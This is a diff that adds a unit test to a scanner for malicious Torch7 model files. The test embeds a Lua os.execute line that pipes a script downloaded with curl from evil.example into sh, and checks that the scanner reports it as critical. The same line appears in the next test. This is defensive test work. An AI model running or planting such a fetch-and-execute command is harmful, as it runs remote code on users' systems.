@@ -38,6 +38,26 @@ def test_can_handle_rejects_pytorch_source_markers(tmp_path: Path) -> None:
     assert not Torch7Scanner.can_handle(str(path))
 
 
+def test_scan_detects_execution_in_ascii_serialized_torch7(tmp_path: Path) -> None:
+    payload = (
+        b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
+        b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
+        b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
+    )
+    path = _write_torch7_file(tmp_path, payload, filename="ascii-malicious.t7")
+
+    assert Torch7Scanner.can_handle(str(path))
+
+    result = Torch7Scanner().scan(str(path))
+    execution_findings = [
+        check
+        for check in result.checks
+        if check.name == "Torch7 Lua Execution Primitive Analysis" and check.status == CheckStatus.FAILED
+    ]
+    assert len(execution_findings) == 1
+    assert execution_findings[0].severity == IssueSeverity.CRITICAL
+
+
 def test_scan_detects_lua_execution_with_network_context(tmp_path: Path) -> None:
     payload = (
         b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
